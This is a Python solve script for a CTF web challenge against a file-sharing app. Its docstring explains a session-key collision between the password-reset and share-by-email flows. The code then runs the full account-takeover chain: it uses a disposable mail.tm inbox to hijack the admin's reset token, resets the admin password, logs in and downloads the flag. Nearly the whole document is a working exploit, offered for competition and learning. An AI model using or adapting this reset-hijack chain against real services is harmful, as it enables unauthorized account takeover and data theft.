"""Solve for Avito CTF 2026 "Не влезай — ужалит" (notrespassing / MyOwnCloud).

Approach (see notrespassing_writeup.md §3-4 for the full reasoning):

MyOwnCloud has a "forgot password" flow (PasswordResetController) and a
"share by email" flow (FileController::share). Both flows write into the SAME
session key, `$_SESSION['contact_email']`, for unrelated purposes: the reset
flow uses it to remember *who receives the reset e-mail*, while the share
flow uses it only to pre-fill the "recipient" field on the next visit to the
share form. Because the key is shared, a single browser session can:

  1. POST /password/forgot/request email=admin@cloudbox.local
     -> sets $_SESSION['reset_user_id'] = <admin's id>
        and  $_SESSION['contact_email'] = 'admin@cloudbox.local'
  2. POST /files/share file_id=<our own file> email=<an email WE control>
     -> overwrites $_SESSION['contact_email'] to our address, while
        reset_user_id (still admin's id) is untouched by share().
  3. POST /password/forgot/finalize
     -> creates a real password_resets token bound to ADMIN's user id,
        and mails it to whatever contact_email now is: our address.

Separately, `/password/reset` (which consumes that token to set a new
password) never special-cases the admin account -- only `/password/change`
does (via requireMutableUser()). So once we have a token that is bound to
admin's user_id, we can set an arbitrary new password for admin@cloudbox.local
and log in as them.

The live instance's "sender" microservice, unlike the docker-compose.yml
in the challenge source (which points SMTP at a local MailHog container that
is not internet-reachable), relays outbound mail through a real SMTP relay
in production. So a disposable, API-readable mailbox (mail.tm, no captcha,
free JSON API) is enough to receive and read the token.

End to end: register two throwaway accounts (one normal, one backed by a
mail.tm inbox) -> run the session/contact_email swap above -> read the
token from the mail.tm inbox -> reset admin's password -> log in as admin
-> GET /files/download?id=1 (admin's `wiring-diagram.txt`, always the first
file row ever created by bootstrap.php) -> flag.

Usage:
    uv run python notrespassing/solve_notrespassing.py [BASE_URL]

Dependencies are installed by the repository's root ``uv sync``.
"""

from __future__ import annotations

import re
import sys
import time

import requests

DEFAULT_BASE = "https://notrespassing-0lcz8q7e.avitoctf.ru"
MAILTM_API = "https://api.mail.tm"
PASSWORD = "SuperSecret123"
NEW_ADMIN_PASSWORD = "PwnedAdmin123!"
ADMIN_EMAIL = "admin@cloudbox.local"


def make_mailtm_inbox() -> tuple[str, str]:
    """Create a free, API-readable disposable mailbox via mail.tm.

    Returns:
        Tuple of (email_address, jwt_token) for the new mailbox.
    """
    domain = requests.get(f"{MAILTM_API}/domains", timeout=15).json()["hydra:member"][0]["domain"]
    local = f"notresp{int(time.time())}"
    address = f"{local}@{domain}"
    account_password = "MailtmPass123!"

    r = requests.post(
        f"{MAILTM_API}/accounts",
        json={"address": address, "password": account_password},
        timeout=15,
    )
    r.raise_for_status()

    r = requests.post(
        f"{MAILTM_API}/token",
        json={"address": address, "password": account_password},
        timeout=15,
    )
    r.raise_for_status()
    jwt = r.json()["token"]
    return address, jwt


def wait_for_reset_mail(jwt: str, timeout_s: int = 60) -> str:
    """Poll the mail.tm inbox until the reset-token email arrives.

    Args:
        jwt: mail.tm bearer token for the target inbox.
        timeout_s: how long to poll before giving up.

    Returns:
        The 48-hex-char password reset token extracted from the email body.
    """
    headers = {"Authorization": f"Bearer {jwt}"}
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        r = requests.get(f"{MAILTM_API}/messages", headers=headers, timeout=15)
        r.raise_for_status()
        messages = r.json().get("hydra:member", [])
        for m in messages:
            msg = requests.get(
                f"{MAILTM_API}/messages/{m['id']}", headers=headers, timeout=15
            ).json()
            text = msg.get("text", "") or ""
            match = re.search(r"[0-9a-f]{48}", text)
            if match:
                return match.group(0)
        time.sleep(2)
    raise TimeoutError("reset e-mail never arrived in the mail.tm inbox")


def register(session: requests.Session, base: str, email: str, password: str) -> None:
    """Register a MyOwnCloud account (idempotent enough for demo purposes)."""
    session.post(
        f"{base}/register", data={"email": email, "password": password}, allow_redirects=False
    )


def login(session: requests.Session, base: str, email: str, password: str) -> None:
    """Log into MyOwnCloud, raising if the login redirect doesn't happen."""
    r = session.post(
        f"{base}/login",
        data={"email": email, "password": password},
        allow_redirects=False,
    )
    if r.headers.get("location") != "/dashboard":
        raise RuntimeError(f"login failed for {email}: {r.status_code} {r.headers.get('location')}")


def upload_dummy_file(session: requests.Session, base: str) -> int:
    """Upload a throwaway file and return its numeric file id."""
    session.post(
        f"{base}/files/upload",
        files={"upload": ("bait.txt", b"bait", "text/plain")},
        allow_redirects=False,
    )
    listing = session.get(f"{base}/files").text
    ids = [int(i) for i in re.findall(r"download\?id=(\d+)", listing)]
    return max(ids)


def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE

    attacker_email = f"attacker{int(time.time())}@example.com"
    mailtm_address, mailtm_jwt = make_mailtm_inbox()
    print(f"[*] attacker account : {attacker_email}")
    print(f"[*] mail.tm inbox    : {mailtm_address}")

    s = requests.Session()
    register(s, base, attacker_email, PASSWORD)
    login(s, base, attacker_email, PASSWORD)

    # A second, mail.tm-backed account must exist so FileController::share()
    # accepts it as a valid recipient (it looks the recipient up by email).
    register(s, base, mailtm_address, PASSWORD)

    file_id = upload_dummy_file(s, base)
    print(f"[*] uploaded bait file id={file_id}")

    r = s.post(
        f"{base}/password/forgot/request", data={"email": ADMIN_EMAIL}, allow_redirects=False
    )
    print(f"[*] requested reset for {ADMIN_EMAIL}: {r.status_code}")

    r = s.post(
        f"{base}/files/share",
        data={"file_id": str(file_id), "email": mailtm_address},
        allow_redirects=False,
    )
    print(f"[*] shared bait file with {mailtm_address} (hijacks contact_email): {r.status_code}")

    r = s.post(f"{base}/password/forgot/finalize", allow_redirects=False)
    print(f"[*] finalized reset -> admin's token mailed to {mailtm_address}: {r.status_code}")

    print("[*] waiting for e-mail ...")
    token = wait_for_reset_mail(mailtm_jwt)
    print(f"[*] recovered admin reset token: {token}")

    r = s.post(
        f"{base}/password/reset",
        data={"token": token, "password": NEW_ADMIN_PASSWORD},
        allow_redirects=False,
    )
    print(f"[*] reset admin's password: {r.status_code} -> {r.headers.get('location')}")

    admin_session = requests.Session()
    login(admin_session, base, ADMIN_EMAIL, NEW_ADMIN_PASSWORD)
    print("[*] logged in as admin@cloudbox.local")

    r = admin_session.get(f"{base}/files/download?id=1")
    print(f"[*] downloaded file id=1: {r.headers.get('content-disposition')}")
    print(f"[+] FLAG: {r.text.strip()}")


if __name__ == "__main__":
    main()
